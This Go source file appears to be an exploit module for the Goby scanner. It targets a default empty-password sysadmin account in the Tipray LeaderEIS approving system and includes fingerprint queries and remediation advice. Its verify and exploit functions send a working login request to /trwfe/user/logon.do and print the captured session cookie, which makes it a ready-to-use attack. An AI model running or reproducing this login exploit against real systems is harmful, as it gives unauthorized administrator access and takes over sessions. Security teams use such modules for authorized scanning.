package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
)

func init() {
    expJson := `{
    "Name": "tipray leadereis approving system default password",
    "Description": "<p>Tipray LeaderEIS approving system is an encryption software system that ensures data security and use security from the source.</p><p>There is a default password in the Tipray LeaderEIS approving system. An attacker can login to the background of the system by using the default empty password account sysadmin, and operate the core functions with administrator privileges.</p>",
    "Product": "Tipray LeaderEIS approving system",
    "Homepage": "https://www.tipray.com/",
    "DisclosureDate": "2022-07-09",
    "Author": "蜡笔小新",
    "FofaQuery": "body=\"location.href=location.href+\\\"trwfe\\\";\"",
    "GobyQuery": "body=\"location.href=location.href+\\\"trwfe\\\";\"",
    "Level": "0",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "天锐绿盾审批系统默认密码漏洞",
            "Product": "天锐绿盾审批系统",
            "Description": "<p>天锐绿盾审批系统是一套从源头上保障数据安全和使用安全的加密软件系统。<br></p><p>天锐绿盾审批系统存在默认口令，攻击者可利用默认空口令账户 sysadmin 登录系统后台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "tipray leadereis approving system default password",
            "Product": "Tipray LeaderEIS approving system",
            "Description": "<p>Tipray LeaderEIS approving system is an encryption software system that ensures data security and use security from the source.</p><p>There is a default password in the Tipray LeaderEIS approving system. An attacker can login to the background of the system by using the default empty password account sysadmin, and operate the core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            uri := "/trwfe/user/logon.do"
            cfg := httpclient.NewPostRequestConfig(uri)
            cfg.VerifyTls = false
            cfg.FollowRedirect = false
            cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
            cfg.Data = "lastName=sysadmin&password=&j_language=zh-CN"
            if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
                return resp.StatusCode == 302 && strings.Contains(resp.Cookie, "sid=")
            }
            return false
        },
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            uri := "/trwfe/user/logon.do"
            cfg := httpclient.NewPostRequestConfig(uri)
            cfg.VerifyTls = false
            cfg.FollowRedirect = false
            cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
            cfg.Data = "lastName=sysadmin&password=&j_language=zh-CN"
            if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
                expResult.Output = "username: sysadmin password:\r\n" + "cookie:" + resp.Cookie
                expResult.Success = true
            }
            return expResult
        },
    ))
}
